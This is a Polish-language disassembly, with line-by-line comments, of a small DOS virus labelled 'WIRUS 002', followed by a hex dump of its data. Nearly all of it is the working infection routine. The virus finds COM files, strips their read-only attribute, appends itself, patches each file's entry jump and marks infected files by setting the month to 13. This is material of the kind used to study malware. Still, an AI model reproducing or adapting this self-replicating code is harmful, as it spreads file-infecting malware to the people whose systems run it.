

                                    WIRUS 002

   Poni§szy wirus nie dokonuje praktycznie §adnych istotnych szk¢d. Powiela si‘ 
w katalogu aktualnym lub g’¢wnym. Atakuje jedynie pliki typu COM. Po doklejeniu 
si‘ do ko¤ca programu zmienia dat‘ jego ostatniej modyfikacji podaj†c jako numer
miesi†ca liczb‘ 13. Ka§dy plik jest atakowany co najwy§ej raz.

04EE 50            PUSH    AX
04EF BE5306        MOV     SI,0653     ; d’ugož zainfekowanego pliku - 3
04F2 8BD6          MOV     DX,SI       ; zarazem miejsce przechowania jego
04F4 81C60000      ADD     SI,0000     ; pierwszych trzech bajt¢w
04F8 FC            CLD
04F9 B90300        MOV     CX,0003     ; odtworzenie pierwszych trzech
04FC BF0001        MOV     DI,0100     ; bajt¢w zainfekowanego pliku
04FF F3            REPZ
0500 A4            MOVSB
0501 8BFA          MOV     DI,DX       ; pierwszy wolny bajt za programem
0503 B430          MOV     AH,30       
0505 CD21          INT     21          ; Get DOS version
0507 3C00          CMP     AL,00
0509 7503          JNZ     050E        ; wersja >= 2.00

050B E93F01        JMP     064D        ; nie ruszaj wersji 1.xx

050E BA2C00        MOV     DX,002C
0511 03D7          ADD     DX,DI       ; DX := 67F
0513 8BDA          MOV     BX,DX       ; nowy adres DTA
0515 B41A          MOV     AH,1A       ; Set DTA adress
0517 CD21          INT     21          ; DS:DX adres DTA

0519 BD0000        MOV     BP,0000     ; Flaga 'pierwsza pr¢ba' ?
051C 8BD7          MOV     DX,DI
051E 81C20700      ADD     DX,0007     ; adres ????????COM

0522 B90300        MOV     CX,0003     ; atrybuty pliku Read Only, Hiden
0525 B44E          MOV     AH,4E       ; Find First
0527 CD21          INT     21
0529 E90400        JMP     0530

052C B44F          MOV     AH,4F       ; Find Next
052E CD21          INT     21

0530 7315          JAE     0547        ; znaleziono plik typu COM

0532 3C12          CMP     AL,12
0534 7403          JZ      0539        ; nie ma wi‘cej takich plik¢w

0536 E90D01        JMP     0646        ; koniec

0539 83FDFF        CMP     BP,-01      ; flaga?
053C 7503          JNZ     0541

053E E90501        JMP     0646        ; koniec

0541 4A            DEC     DX
0542 BDFFFF        MOV     BP,FFFF     ; Znacznik, §e to ju§ ostatnia pr¢ba?
0545 EBDB          JMP     0522        ; szukaj nast‘pnego pliku typu COM

0547 8B4F18        MOV     CX,[BX+18]  ; Data znalezionego pliku
054A 81E1E001      AND     CX,01E0     ; wytnij miesi†c
054E 81F9A001      CMP     CX,01A0     ; przyr¢wnaj do 13
0552 74D8          JZ      052C        ; szukaj dalszych plik¢w COM

0554 817F1A00FA    CMP     WORD PTR [BX+1A],FA00 ; oszcz‘d¦ pliki d’u§sze od
0559 77D1          JA      052C        ; 64000 i szukaj dalszych plik¢w COM

055B 817F1A0001    CMP     WORD PTR [BX+1A],0100 ; oszcz‘d¦ pliki kr¢tsze od
0560 72CA          JB      052C        ; 256 i szukaj dalszych plik¢w COM

0562 57            PUSH    DI          ; przechowaj adres DTA
0563 8BF3          MOV     SI,BX       ; adres DTA do SI
0565 83C61E        ADD     SI,+1E      ; nazwa wczytanego pliku
0568 81C71400      ADD     DI,0014
056C 83FDFF        CMP     BP,-01      ; ostatnie podejžcie?
056F 7503          JNZ     0574        ; tak

0571 B05C          MOV     AL,5C       ; '\', copiuj ASCIIZ ’a¤cuch
0573 AA            STOSB               ; AL --> ES:DI, DI := DI + 1
0574 AC            LODSB               ; DS:SI --> AL, SI := SI + 1
0575 AA            STOSB               ; AL --> ES:DI, DI := DI + 1
0576 3C00          CMP     AL,00
0578 75FA          JNZ     0574

057A 5F            POP     DI          ; odtw¢rz adres DTA
057B 8BD7          MOV     DX,DI
057D 81C21400      ADD     DX,0014     ; DS:DX nazwa pliku
0581 B80043        MOV     AX,4300     ; Get File Attribute
0584 CD21          INT     21

0586 898D2200      MOV     [DI+0022],CX  ; przechowaj atrybuty pliku
058A 81E1FEFF      AND     CX,FFFE     ; wy’†cz Read Only
058E 8BD7          MOV     DX,DI
0590 81C21400      ADD     DX,0014
0594 B80143        MOV     AX,4301     ; Set File Attribute
0597 CD21          INT     21

0599 8BD7          MOV     DX,DI
059B 81C21400      ADD     DX,0014     ; adres ASCIIZ napisu (nazwa pliku)
059F B8023D        MOV     AX,3D02     ; tryb Read/Write
05A2 CD21          INT     21          ; Open File
05A4 7303          JAE     05A9        ; operacja udana

05A6 E99400        JMP     063D        ; fiasko, koniec

05A9 8BD8          MOV     BX,AX       ; Get File's Data and Time (nr Handle)
05AB B80057        MOV     AX,5700
05AE CD21          INT     21

05B0 898D2400      MOV     [DI+0024],CX   ; przechowaj czas
05B4 89952600      MOV     [DI+0026],DX   ; przechowaj dat‘
05B8 B43F          MOV     AH,3F       ; Read From File
05BA B90300        MOV     CX,0003     ; 3 bajty
05BD 8BD7          MOV     DX,DI
05BF 81C20000      ADD     DX,0000     ; DS:DX adres bufora
05C3 CD21          INT     21
05C5 7303          JAE     05CA        ; operacja udana

05C7 E95A00        JMP     0624        ; koniec

05CA 3D0300        CMP     AX,0003     ; kontrola liczby wczytanych bajt¢w
05CD 7555          JNZ     0624        ;  <> 3 koniec

05CF B80242        MOV     AX,4202     ; Move File Pointer (na koniec)
05D2 B90000        MOV     CX,0000     ; CX:DX offset w bajtach
05D5 8BD1          MOV     DX,CX       ; (32 bitowa liczba)
05D7 CD21          INT     21      
05D9 2D0300        SUB     AX,0003     ; DX:AX nowy (aktualny offset)
05DC 89850400      MOV     [DI+0004],AX  ; przechowaj
05E0 B96501        MOV     CX,0165
05E3 83FA00        CMP     DX,+00      ; d’ugož plku (bardziej znacz†ce s’owo)
05E6 753C          JNZ     0624        ; koniec

05E8 8BD7          MOV     DX,DI
05EA 2BF9          SUB     DI,CX
05EC 83C702        ADD     DI,+02
05EF 050301        ADD     AX,0103
05F2 03C1          ADD     AX,CX
05F4 8905          MOV     [DI],AX
05F6 B440          MOV     AH,40       ; Write To File
05F8 8BFA          MOV     DI,DX
05FA 2BD1          SUB     DX,CX       ; DS:DX adres bufora
05FC B91602        MOV     CX,0216     ; d’ugož wirusa (534 bajty)
05FF CD21          INT     21
0601 7303          JAE     0606

0603 E91E00        JMP     0624        ; koniec

0606 3D1602        CMP     AX,0216     ; kontrola liczby przes’anych bajt¢w
0609 7519          JNZ     0624

060B B80042        MOV     AX,4200     ; Move File Pointer
060E B90000        MOV     CX,0000
0611 8BD1          MOV     DX,CX
0613 CD21          INT     21          ; przesu¤ si‘ na pocz†tek pliku
0615 720D          JB      0624        ; ježli jakiž b’†d to koniec

0617 B440          MOV     AH,40       ; Write To File
0619 B90300        MOV     CX,0003     ; trzy pierwsze bajty bajty
061C 8BD7          MOV     DX,DI
061E 81C20300      ADD     DX,0003
0622 CD21          INT     21

0624 8B8D2400      MOV     CX,[DI+0024]  ; odtw¢rz czas
0628 8B952600      MOV     DX,[DI+0026]  ; odtw¢rz dat‘
062C 81E21FFE      AND     DX,FE1F     ; modyfikuj miesi†c
0630 81CAA001      OR      DX,01A0     ; miesi†c := 13
0634 B80157        MOV     AX,5701     ; Set File's Date and Time
0637 CD21          INT     21
0639 B43E          MOV     AH,3E       ; Close a File Handle (nr w BX)
063B CD21          INT     21

; b’†d w kodzie, powinno by MOV AX,4301  ; set file attribute

063D B80043        MOV     AX,4300     ; Get File Attribute
0640 8B8D2200      MOV     CX,[DI+0022]  ; odtw¢rz atrybuty zara§anego pliku
0644 CD21          INT     21

0646 BA8000        MOV     DX,0080     ; przywr¢ oryginalne DTA
0649 B41A          MOV     AH,1A       ; Set DTA adres
064B CD21          INT     21
064D 58            POP     AX          ; koniec
064E BF0001        MOV     DI,0100     ; oddaj sterowanie do programu
0651 57            PUSH    DI
0652 C3            RET

0653           E9 8E 01 E9 EB-03 5C 3F 3F 3F 3F 3F 3F      i..ik.\??????
0660  3F 3F 2E 43 4F 4D 00 43-4F 4C 4F 52 2E 43 4F 4D   ??.COM.COLOR.COM
0670  00 4F 4D 00 00 20 00 00-C0 21 0C 00 00 00 00
067F                                                    01   .OM.. ..@!......
0680  3F 3F 3F 3F 3F 3F 3F 3F-43 4F 4D 03 0A 00 00 00   ????????COM.....
0690  00 00 00 00 20 00 C0 21-0C EE 03 00 00 43 4F 4C   .... .@!.n...COL
06A0  4F 52 2E 43 4F 4D 00 4D-00 00 6F 73 6F 66 74 79   OR.COM.M..osofty
06B0  72 69 67 68 74 20 4D 69-63 72 6F 73 6F 66 74 79   right Microsofty
06C0  72 69 67 68 74 20 4D 69-63 72 6F 73 6F 66 74 79   right Microsofty
06D0  72 69 67 68 74 20 4D 69-63 72 6F 73 6F 66 74 79   right Microsofty
06E0  72 69 67 68 74 20 4D 69-63 72 6F 73 6F 66 74 79   right Microsofty
06F0  72 69 67 68 74 20 4D 69-63 72 6F 73 6F 66 74 20   right Microsoft
0700  31 39 38 38                                       1988 


